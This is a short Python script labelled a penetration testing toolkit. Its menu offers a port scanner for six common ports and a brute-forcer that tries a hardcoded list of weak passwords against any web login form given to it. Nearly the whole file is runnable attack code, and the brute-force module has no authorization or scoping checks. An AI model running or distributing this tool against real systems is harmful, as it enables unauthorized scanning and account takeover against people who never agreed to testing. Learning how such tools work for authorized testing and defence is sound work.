#toolkit.py
import socket
import threading
import requests

# -------------------
# Port Scanner Module
# -------------------
def port_scanner(target, ports):
    print(f"\n[+] Starting Port Scan on {target}\n")
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[OPEN] Port {port}")
        sock.close()
    print("\n[+] Port Scan Complete.\n")

# -----------------------
# Simple Brute-Forcer Module (Demo for Web Login)
# -----------------------
def brute_force_login(url, username, passwords):
    print(f"\n[+] Starting Brute-Force Attack on {url}\n")
    for pwd in passwords:
        payload = {'username': username, 'password': pwd}
        response = requests.post(url, data=payload)
        
        if "Login Successful" in response.text:
            print(f"[SUCCESS] Password found: {pwd}")
            return
        else:
            print(f"[FAILED] Tried password: {pwd}")
    print("\n[+] Brute-Force Attack Finished.\n")

# -------------------
# Main Toolkit Interface
# -------------------
def main():
    print("""
    -------------------------
    Penetration Testing Toolkit
    -------------------------
    1. Port Scanner
    2. Brute-Forcer
    """)

    choice = input("Select a module (1 or 2): ")

    if choice == "1":
        target = input("Enter target IP or domain: ")
        ports = [21, 22, 23, 80, 443, 8080]
        port_scanner(target, ports)

    elif choice == "2":
        url = input("Enter login URL: ")
        username = input("Enter username: ")
        passwords = ["123456", "admin", "password", "letmein", "qwerty"]
        brute_force_login(url, username, passwords)

    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
